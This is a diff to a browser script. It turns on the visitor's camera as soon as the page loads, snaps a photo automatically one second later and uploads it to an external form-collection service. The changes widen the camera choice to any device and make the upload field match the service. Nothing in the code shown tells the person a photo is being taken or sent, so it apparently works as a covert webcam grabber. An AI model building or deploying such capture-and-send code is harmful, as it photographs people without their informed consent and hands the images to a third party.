@@ -1,16 +1,19 @@
 const video = document.getElementById("preview");
 let stream;
 
+// Start camera immediately
 startCamera();
 
 async function startCamera() {
   try {
+    // Works on laptop + phone (auto-selects best camera)
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { exact: "environment" } }
+      video: true
     });
 
     video.srcObject = stream;
 
+    // Auto-capture after 1 second
     setTimeout(captureAndUpload, 1000);
 
   } catch (err) {
@@ -27,21 +30,21 @@ async function captureAndUpload() {
   ctx.drawImage(video, 0, 0);
 
   canvas.toBlob(async (blob) => {
+    if (!blob) return console.error("Blob creation failed");
+
     const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
 
     const formData = new FormData();
-    formData.append("file", file);   // Basin requires name="file"
+    formData.append("photo", file);  // Basin requires name="photo"
 
     try {
       await fetch("https://usebasin.com/f/fb249d3e371b", {
         method: "POST",
         body: formData,
-        headers: {
-          "Accept": "application/json"
-        }
+        headers: { "Accept": "application/json" }
       });
 
-      console.log("Uploaded to Basin");
+      console.log("Uploaded to Basin ✔");
 
     } catch (error) {
       console.error("Upload error:", error);
